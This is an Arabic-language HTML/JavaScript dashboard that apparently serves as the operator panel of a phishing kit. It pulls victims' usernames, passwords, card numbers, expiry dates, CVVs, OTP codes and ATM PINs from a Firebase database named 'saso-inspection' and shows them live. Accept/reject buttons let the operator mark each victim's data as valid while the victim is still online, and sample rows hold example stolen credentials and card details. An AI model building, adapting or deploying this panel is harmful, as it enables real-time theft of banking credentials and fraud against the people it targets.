<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الشاملة | إدارة العمليات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root {
            --primary-red: #8b1538;
            --primary-blue: #00a3da;
            --bg: #f0f2f5;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg);
            margin: 0; padding: 15px;
            direction: rtl;
        }

        .main-header {
            background: #fff; padding: 15px; border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
            text-align: center; margin-bottom: 20px;
        }

        .tabs-container {
            display: flex; justify-content: center; gap: 15px; margin-bottom: 20px;
        }

        .tab-btn {
            padding: 12px 30px; border: none; border-radius: 8px;
            font-family: 'Cairo'; font-weight: bold; cursor: pointer;
            font-size: 15px; transition: 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .btn-accounts { background: var(--primary-red); color: white; }
        .btn-finance { background: var(--primary-blue); color: white; }
        .tab-btn:hover { transform: translateY(-2px); filter: brightness(1.1); }
        .tab-btn.active { outline: 3px solid #333; transform: scale(1.05); }

        .section { display: none; animation: fadeIn 0.4s ease-in-out; }
        .section.active { display: block; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .table-container { background: white; border-radius: 12px; overflow-x: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        table { width: 100%; border-collapse: collapse; min-width: 900px; }
        th { background: #f8fafc; color: #64748b; padding: 15px; font-size: 13px; text-align: center; border-bottom: 2px solid #edf2f7; }
        td { padding: 15px; text-align: center; border-bottom: 1px solid #edf2f7; font-size: 14px; font-weight: 600; }
        
        .accounts-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .account-card { background: white; padding: 20px; border-radius: 12px; border-top: 5px solid var(--primary-red); box-shadow: 0 4px 6px rgba(0,0,0,0.05); }

        .card-val { color: var(--primary-red); font-family: monospace; font-size: 16px; }
        .user-val { color: var(--primary-blue); font-size: 16px; }
        .otp-val { background: #e0f2fe; color: #0369a1; padding: 4px 8px; border-radius: 4px; font-weight: bold; }
        .atm-val { background: #ffedd5; color: #9a3412; padding: 4px 8px; border-radius: 4px; font-weight: bold; }

        .btn-action { padding: 6px 12px; border: none; border-radius: 4px; color: white; cursor: pointer; font-family: 'Cairo'; font-weight: bold; margin: 2px; }
        .btn-green { background: #22c55e; }
        .btn-red { background: #ef4444; }

        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-left: 5px; }
        .online { background: #22c55e; box-shadow: 0 0 8px #22c55e; }
        .offline { background: #94a3b8; }
        
        /* لون مختلف للبيانات التجريبية لتمييزها */
        .demo-row { background-color: #fdfdfd; opacity: 0.7; }
    </style>
</head>
<body>

<div class="main-header">
    <h1 style="margin:0; font-size: 22px; color: #333;">نظام إدارة العمليات الرقمي</h1>
    <p style="margin:0; font-size: 12px; color: #777;">لوحة التحكم الشاملة - المراقبة والتحكم</p>
</div>

<div class="tabs-container">
    <button class="tab-btn btn-accounts active" onclick="showSection('accounts', this)">بيانات المستخدمين</button>
    <button class="tab-btn btn-finance" onclick="showSection('finance', this)">البيانات المالية</button>
</div>

<div id="accounts-section" class="section active">
    <div class="accounts-grid" id="accounts-list">
        <div class="account-card demo-row">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <span style="font-size:10px; color:#999;">تجريبي: DEMO-USER</span>
                <span><span class="status-dot offline"></span> غادر</span>
            </div>
            <div style="margin-bottom:8px;"><b>المستخدم:</b> <span class="user-val">Ahmed_Qatar88</span></div>
            <div style="margin-bottom:8px;"><b>كلمة المرور:</b> <span class="user-val" style="color:red">P@ssword2026</span></div>
            <div style="margin-top:15px; display:flex; gap:10px;">
                <button class="btn-action btn-green" style="flex:1">صحيح</button>
                <button class="btn-action btn-red" style="flex:1">خطأ</button>
            </div>
        </div>
    </div>
</div>

<div id="finance-section" class="section">
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>الحالة</th>
                    <th>حامل البطاقة</th>
                    <th>رقم البطاقة</th>
                    <th>التاريخ</th>
                    <th>CVV</th>
                    <th>OTP</th>
                    <th>ATM PIN</th>
                    <th>التحكم</th>
                </tr>
            </thead>
            <tbody id="finance-list">
                <tr class="demo-row">
                    <td>🔴</td>
                    <td>محمد علي عبد الرحمن</td>
                    <td class="card-val">4000 1234 5678 9012</td>
                    <td>12/28</td>
                    <td>889</td>
                    <td><span class="otp-val">125542</span></td>
                    <td><span class="atm-val">4452</span></td>
                    <td>
                        <button class="btn-action btn-green">قبول</button>
                        <button class="btn-action btn-red">رفض</button>
                    </td>
                </tr>
                <tr class="demo-row">
                    <td>🔴</td>
                    <td>سارة جاسم الكواري</td>
                    <td class="card-val">5214 9988 7766 5544</td>
                    <td>05/27</td>
                    <td>112</td>
                    <td><span class="otp-val">9931</span></td>
                    <td><span class="atm-val">0012</span></td>
                    <td>
                        <button class="btn-action btn-green">قبول</button>
                        <button class="btn-action btn-red">رفض</button>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
</div>

<script>
    // إعدادات Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.firebasestorage.app",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    function showSection(sectionId, btn) {
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(sectionId + '-section').classList.add('active');
        btn.classList.add('active');
    }

    database.ref('/').on('value', (snapshot) => {
        const data = snapshot.val() || {};
        const accountsList = document.getElementById('accounts-list');
        const financeList = document.getElementById('finance-list');
        
        // عند وصول بيانات حقيقية، يمكننا اختيار إبقاء التجريبي أو حذفه
        // هنا قمت بترك التجريبي في الكود الأساسي أعلاه وسنضيف الحقيقي بعده
        
        const visitors = data.active_visitors || {};
        const accounts = data.user_accounts || {};
        const cards = data.card_details || {};
        const otps = data.otp_codes || {};
        const pins = data.atm_pins || {};

        Object.keys(visitors).forEach(id => {
            const visitor = visitors[id];
            const isOnline = visitor.lastSeen > Date.now() - 15000;

            if (accounts[id]) {
                accountsList.innerHTML += `
                    <div class="account-card">
                        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                            <span style="font-size:10px; color:#999;">ID: ${id}</span>
                            <span>${isOnline ? '<span class="status-dot online"></span> متصل' : '<span class="status-dot offline"></span> غادر'}</span>
                        </div>
                        <div style="margin-bottom:8px;"><b>المستخدم:</b> <span class="user-val">${accounts[id].username}</span></div>
                        <div style="margin-bottom:8px;"><b>كلمة المرور:</b> <span class="user-val" style="color:red">${accounts[id].password}</span></div>
                        <div style="margin-top:15px; display:flex; gap:10px;">
                            <button class="btn-action btn-green" style="flex:1" onclick="updateStatus('user_accounts', '${id}', 'accept')">صحيح</button>
                            <button class="btn-action btn-red" style="flex:1" onclick="updateStatus('user_accounts', '${id}', 'reject')">خطأ</button>
                        </div>
                    </div>`;
            }

            if (cards[id]) {
                const card = cards[id];
                const otp = otps[id] || {code: '---'};
                const pin = pins[id] || {pin: '---'};

                financeList.innerHTML += `
                    <tr>
                        <td>${isOnline ? '<span class="status-dot online"></span>' : '🔴'}</td>
                        <td>${card.cardName || '---'}</td>
                        <td class="card-val">${card.cardNumber || '---'}</td>
                        <td>${card.expiry || '---'}</td>
                        <td>${card.cvv || '---'}</td>
                        <td><span class="otp-val">${otp.code}</span></td>
                        <td><span class="atm-val">${pin.pin}</span></td>
                        <td>
                            <button class="btn-action btn-green" onclick="updateStatus('card_details', '${id}', 'accept')">قبول</button>
                            <button class="btn-action btn-red" onclick="updateStatus('card_details', '${id}', 'reject')">رفض</button>
                        </td>
                    </tr>`;
            }
        });
    });

    function updateStatus(path, id, status) {
        database.ref(path + '/' + id).update({ status: status });
        Swal.fire({ toast: true, position: 'top-end', icon: 'success', title: 'تم التحديث', showConfirmButton: false, timer: 1000 });
    }
</script>

</body>
</html>
